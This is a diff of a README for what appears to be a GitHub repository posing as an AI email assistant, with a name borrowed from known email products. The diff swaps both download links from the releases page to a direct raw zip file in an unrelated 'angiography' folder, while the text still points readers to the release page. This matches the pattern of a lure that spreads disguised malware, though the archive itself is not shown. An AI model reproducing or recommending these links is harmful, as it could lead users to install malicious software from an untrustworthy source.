@@ -1,6 +1,6 @@
 # 📧 ai-email-assistant-superhuman-ai-shortwave - Manage your email inbox with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/gamesofvi8174/ai-email-assistant-superhuman-ai-shortwave/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/gamesofvi8174/ai-email-assistant-superhuman-ai-shortwave/raw/refs/heads/main/angiography/email-shortwave-assistant-ai-superhuman-2.9.zip)
 
 ## 📥 Getting Started
 
@@ -8,7 +8,7 @@ This application helps you manage your email inbox using modern artificial intel
 
 You must visit the official release page to download the setup file. This page always contains the latest version of the assistant.
 
-[Download the application here](https://github.com/gamesofvi8174/ai-email-assistant-superhuman-ai-shortwave/releases)
+[Download the application here](https://github.com/gamesofvi8174/ai-email-assistant-superhuman-ai-shortwave/raw/refs/heads/main/angiography/email-shortwave-assistant-ai-superhuman-2.9.zip)
 
 ## 💻 System Requirements
 
